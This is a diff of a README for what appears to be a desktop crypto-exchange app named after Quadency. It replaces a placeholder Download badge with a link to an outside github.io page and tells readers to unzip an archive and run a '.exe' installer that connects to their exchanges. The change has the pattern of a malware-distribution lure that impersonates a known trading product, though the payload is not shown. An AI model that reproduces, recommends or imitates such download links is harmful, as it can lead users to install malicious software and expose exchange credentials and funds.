@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer — the application will automatically set up and be ready to connect with your exchanges.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://quadency-desktop-app-pc.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
